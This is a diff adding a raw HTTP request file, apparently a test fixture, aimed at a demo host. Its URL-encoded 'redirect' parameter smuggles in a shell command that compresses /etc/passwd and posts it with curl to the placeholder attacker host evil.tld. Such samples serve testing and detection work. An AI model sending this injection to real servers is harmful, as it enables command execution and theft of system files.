@@ -1,0 +1,4 @@
+GET /a?redirect=%7C%2Bgzip%2B%2Fetc%2Fpasswd%2B%7C%2Bcurl%2B-X%2BPOST%2B-d%2B%40-%2Bhttp%3A%2F%2Fevil.tld HTTP/1.1
+Host: demo.example.com
+Connection: close
+
